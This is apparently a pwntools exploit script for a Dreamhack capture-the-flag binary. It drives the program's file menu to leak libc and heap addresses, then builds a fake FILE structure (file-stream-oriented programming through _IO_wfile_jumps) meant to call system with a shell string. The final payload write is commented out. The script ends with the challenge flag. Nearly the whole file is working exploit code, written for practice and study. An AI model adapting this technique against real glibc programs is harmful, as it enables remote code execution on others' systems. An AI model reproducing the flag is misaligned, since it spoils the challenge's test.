#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'prob_patched'
HOST = 'host8.dreamhack.games'
PORT = 21267
GDBSERVER_PORT = 7777

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
set sysroot .
brva 0x1791
brva 0x1664
brva 0x1697
brva 0x1600
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.DOCKER:
        p = remote(HOST, PORT)
        return p
    else:
        p = process(exe.path)
        return p

def attach_gdb():
    if args.GDB:
        if args.DOCKER:
            log.info("1: Vào terminal Docker, lấy PID:")
            log.info("    ps aux | grep prob")
            log.info("2: Attach gdbserver vào PID đó:")
            log.info("    gdbserver --attach 0.0.0.0:7777 <PID>")
            input("3: ENTER để GDB kết nối...")
            gdb.attach((HOST, GDBSERVER_PORT), exe=exe.path, gdbscript=gdbscript)
            input("[!] GDB attached. Press ENTER to continue...")
        elif not args.REMOTE:
            gdb.attach(p, gdbscript=gdbscript)
            input("[!] GDB attached. Press ENTER to continue...")

def sla(prompt, data): p.sendlineafter(prompt, data)
def sa(prompt, data): p.sendafter(prompt, data)
def s(data): p.send(data)
def sl(data): p.sendline(data)
def rcu(data): return p.recvuntil(data)
def rl(): return p.recvline()

# ============================EXPLOIT============================
def f_open(size, name):
    sla(b"> ", b"1")
    sla(b"size: ", str(size).encode())
    sla(b"name: ", name)
def f_read():
    sla(b"> ", b"2")
def f_write(data):
    sla(b"> ", b"3")
    sla(b"input: ", data)
def f_close():
    sla(b"> ", b"4")

def run_exploit():
    global p
    p = start()
    
    f_open(9, b"/tmp/")
    f_write(b"A" * 0x410)
    f_write(b"B"*0x6)
    f_read()
    rcu(b"B"*0x6 + b"\n\x00")
    
    # leak libc
    libc.address = u64(p.recv(8)) - 0x21a1b0
    # leak heap
    heap_base = u64(p.recv(8)) - 0x470

    log.info(f"libc base: {hex(libc.address)}")
    log.info(f"heap base: {hex(heap_base)}")
    attach_gdb()
    for i in range(8):
        f_write(b"C"*0x100)
        f_close()
    
    

    # fsop
    # as it calls fseek first, and fseek calls _IO_SEEKOFF 
    fileptr = heap_base + 0x2a0
    system = libc.symbols['system']
    fp = FileStructure()
    fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
    fp._IO_read_end = system
    fp._IO_write_ptr = 0x10 # add if overwrite _chain 
    fp._IO_write_base = 0x0
    fp._lock = fileptr + 0x50
    fp._wide_data = fileptr # fake FILE struct
    fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0x30 # JUMP_FIELD(_IO_seekoff_t, __seekoff);
    payload = bytes(fp) + p64(fileptr + 0x10 - 0x68)

    # f_write(payload)

    p.interactive()

# ============================MAIN LOGIC============================
while True:
    try:
        run_exploit()
        break
    
    except EOFError:
        p.close()
        sys.stdout.write("\r[-] invalid pointer...")
        sys.stdout.flush()
        
    except Exception as e:
        p.close()
        log.warning(f"\n[!] error: {e}")

# DH{d1db1bb39cbf769c964c7ba063fde122}